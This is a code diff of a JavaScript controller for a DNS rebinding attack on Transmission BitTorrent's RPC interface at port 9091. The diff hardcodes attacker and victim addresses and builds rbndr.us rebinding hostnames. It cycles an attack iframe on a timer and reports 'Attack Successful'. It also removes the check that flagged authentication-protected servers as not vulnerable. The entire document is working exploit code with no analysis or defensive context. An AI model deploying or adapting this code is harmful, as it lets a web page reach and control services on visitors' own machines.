@@ -1,6 +1,11 @@
 var timer;
 var count = 0;
 
+// parameters for attack
+var attacker = "10.0.2.30";
+var victim = "127.0.0.1";
+var interval = 5;
+
 function convert_dotted_quad(addr) {
 	return addr.split('.')
 			.map(function (a) { return Number(a).toString(16) })
@@ -13,10 +18,8 @@ window.addEventListener("message", function (msg) {
 
 	if (msg.data.status == "start") {
 		console.log("iframe reports that attack has started");
-		if (msg.origin == document.getElementById("attack").src.substr(0, msg.origin.length))
-			clearInterval(timer);
-		msg.source.postMessage({cmd: "interval", param: document.getElementById("interval").value}, "*");
-		msg.source.postMessage({cmd: "command", param: document.getElementById("rpc").value}, "*");
+		if (msg.origin == document.getElementById("attack").src.substr(0, msg.origin.length)) clearInterval(timer);
+		msg.source.postMessage({cmd: "interval", param: interval}, "*");
 		msg.source.postMessage({cmd: "start", param: null}, "*");
 	}
 	if (msg.data.status == "session") {
@@ -28,23 +31,22 @@ window.addEventListener("message", function (msg) {
 		clearInterval(timer);
 		alert("Attack Successful: " + msg.data.response);
 	}
-	if (msg.data.status == "auth") {
-		console.log("iframe reports that the tramission server requires auth");
-		attack.contentWindow.postMessage({cmd: "stop"}, "*");
-		clearInterval(timer);
-		alert("Transmission Server Requires Authentication - Not Vulnerable");
-	}
 });
 
 function reloadFrame() {
-	document.getElementById("attack").src = document.getElementById("hosturl").value
-			.replace("%1", convert_dotted_quad(document.getElementById("hostA").value))
-			.replace("%2", convert_dotted_quad(document.getElementById("hostB").value))
-			+ "?rnd=" + Math.random();
+	document.getElementById("attack").src = "http://"
+		+ convert_dotted_quad(attacker)
+		+ "."
+		+ convert_dotted_quad(victim)
+		+ ".rbndr.us:9091/transmission/iframe.html"
+		+ "?rnd=" + Math.random();
+		var tmp = attacker;
+		attacker = victim;
+		victim = tmp;
 }
 
 function begin() {
 	start.disabled = true;
-	timer = setInterval(reloadFrame, parseInt(document.getElementById("interval").value) * 1000);
+	timer = setInterval(reloadFrame, interval * 1000);
 	reloadFrame();
 }
